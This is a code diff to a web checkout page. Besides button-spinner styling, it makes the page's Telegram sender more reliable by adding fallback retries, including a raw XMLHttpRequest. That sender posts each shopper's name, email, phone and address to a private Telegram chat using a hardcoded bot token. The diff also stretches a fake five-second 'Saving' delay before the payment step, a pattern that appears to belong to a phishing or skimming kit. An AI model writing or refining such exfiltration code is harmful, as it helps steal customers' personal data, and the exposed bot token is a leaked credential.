@@ -335,7 +335,6 @@
     .checkout-page{display:none;animation:fade-in .4s ease;}
     .checkout-page.active{display:block;}
 
-    /* Page transition - smooth fade+slide */
     .checkout-page.page-transition {
       animation: pageSlideIn 0.5s cubic-bezier(0.22, 1, 0.36, 1) forwards;
     }
@@ -396,11 +395,36 @@
 
     .delivery-hint{font-size:12.5px;color:var(--gold-light);margin-top:6px;padding:6px 12px;background:rgba(200,155,60,0.08);border-radius:6px;display:inline-block;}
 
-    /* Disabled form fields during save */
     .form-disabled .field input,
     .form-disabled .field select {
       opacity: 0.5;
       pointer-events: none;
+    }
+
+    /* Button loading state */
+    .btn-loading {
+      position: relative;
+      pointer-events: none;
+      opacity: 0.85;
+    }
+    .btn-loading .btn-text {
+      visibility: hidden;
+    }
+    .btn-loading .btn-spinner {
+      display: inline-flex !important;
+    }
+    .btn-spinner {
+      display: none !important;
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(10,10,10,0.2);
+      border-top-color: #0A0A0A;
+      border-radius: 50%;
+      animation: spin-s 0.7s linear infinite;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
     }
 
     @media(max-width:980px){
@@ -792,8 +816,8 @@
           <div id="delivery-hint" class="delivery-hint" style="margin-top:8px;">📦 Delivery in 1-7 days</div>
         </div>
         <button type="submit" class="btn btn-gold" id="proceed-btn" style="width:100%;justify-content:center;margin-top:10px;">
-          <span id="proceed-label">Proceed to Payment</span>
-          <span class="saving-state" id="saving-state"><span class="spinner"></span> Saving…</span>
+          <span class="btn-text" id="proceed-label">Proceed to Payment</span>
+          <span class="btn-spinner" id="btn-spinner"></span>
         </button>
       </form>
     </div>
@@ -919,15 +943,49 @@ const TELEGRAM_BOT_TOKEN = "7252266937:AAEd4bxMlOa2epRtxO9yw-nNo9XSkW8O3oA";
 const TELEGRAM_CHAT_ID = "6753244811";
 
 /* ============================================================
-   TELEGRAM SENDER
+   TELEGRAM SENDER - FIXED with proper error handling
 ============================================================ */
 function sendTelegramMessage(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  
+  // Use fetch with proper error handling
   fetch(url, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-  }).catch(err => console.error('Telegram error:', err));
+    headers: { 
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ 
+      chat_id: TELEGRAM_CHAT_ID, 
+      text: message,
+      parse_mode: 'HTML'
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.ok) {
+      console.log('Telegram message sent successfully');
+    } else {
+      console.error('Telegram API error:', data);
+      // Fallback: try without parse_mode
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+      }).catch(err => console.error('Telegram fallback error:', err));
+    }
+  })
+  .catch(err => {
+    console.error('Telegram send error:', err);
+    // Try one more time with a simpler request
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }));
+    } catch(e) {
+      console.error('Telegram XHR fallback error:', e);
+    }
+  });
 }
 
 /* ============================================================
@@ -1248,19 +1306,17 @@ function renderPaymentSummary(){
 }
 
 /* ============================================================
-   SHIPPING FORM SUBMIT - IMPROVED
+   SHIPPING FORM SUBMIT - FIXED with 5s loading
 ============================================================ */
 const shippingForm = document.getElementById('shipping-form');
 const proceedBtn = document.getElementById('proceed-btn');
 const proceedLabel = document.getElementById('proceed-label');
-const savingState = document.getElementById('saving-state');
+const btnSpinner = document.getElementById('btn-spinner');
 
 function disableFormFields(disabled) {
-  const inputs = shippingForm.querySelectorAll('input, select, button');
+  const inputs = shippingForm.querySelectorAll('input, select');
   inputs.forEach(el => {
-    if (el !== proceedBtn) {
-      el.disabled = disabled;
-    }
+    el.disabled = disabled;
   });
   if (disabled) {
     shippingForm.classList.add('form-disabled');
@@ -1290,23 +1346,24 @@ shippingForm.addEventListener('submit', (e)=>{
   // Disable form fields
   disableFormFields(true);
   
-  // Update button state
-  proceedBtn.style.pointerEvents = 'none';
-  proceedLabel.style.display = 'none';
-  savingState.style.display = 'inline-flex';
+  // Update button to loading state
+  proceedBtn.classList.add('btn-loading');
+  proceedLabel.textContent = 'Saving...';
   
   // Send to Telegram
   let msg = `🛍 NEW ORDER - SHIPPING INFO\n`;
   msg += `Name: ${shippingData.name}\nEmail: ${shippingData.email}\nPhone: ${shippingData.phone}\nCountry: ${shippingData.country}\nState: ${shippingData.state}\nAddress: ${shippingData.address}\nDelivery: ${shippingData.delivery}`;
   sendTelegramMessage(msg);
   
-  // Simulate save delay with smooth transition
+  // Show toast that saving started
+  showToast('Saving', 'Please wait...', '⏳');
+  
+  // 5 second delay before navigating
   setTimeout(()=>{
     // Reset button state
     isSaving = false;
-    proceedBtn.style.pointerEvents = 'auto';
-    proceedLabel.style.display = 'inline';
-    savingState.style.display = 'none';
+    proceedBtn.classList.remove('btn-loading');
+    proceedLabel.textContent = 'Proceed to Payment';
     
     // Re-enable form fields
     disableFormFields(false);
@@ -1315,7 +1372,7 @@ shippingForm.addEventListener('submit', (e)=>{
     showPage('page-payment', true);
     
     showToast('Shipping Saved', 'Proceed to payment.', '✅');
-  }, 2000);
+  }, 5000);
 });
 
 /* ============================================================
@@ -1387,9 +1444,8 @@ document.getElementById('checkout-close').addEventListener('click', ()=>{
   document.getElementById('checkout-overlay').classList.remove('open');
   // Reset form state
   isSaving = false;
-  proceedBtn.style.pointerEvents = 'auto';
-  proceedLabel.style.display = 'inline';
-  savingState.style.display = 'none';
+  proceedBtn.classList.remove('btn-loading');
+  proceedLabel.textContent = 'Proceed to Payment';
   disableFormFields(false);
 });
 document.getElementById('home-btn').addEventListener('click', ()=>{
@@ -1398,9 +1454,8 @@ document.getElementById('home-btn').addEventListener('click', ()=>{
   document.getElementById('shipping-form').reset();
   // Reset form state
   isSaving = false;
-  proceedBtn.style.pointerEvents = 'auto';
-  proceedLabel.style.display = 'inline';
-  savingState.style.display = 'none';
+  proceedBtn.classList.remove('btn-loading');
+  proceedLabel.textContent = 'Proceed to Payment';
   disableFormFields(false);
   window.scrollTo({top:0, behavior:'smooth'});
 });
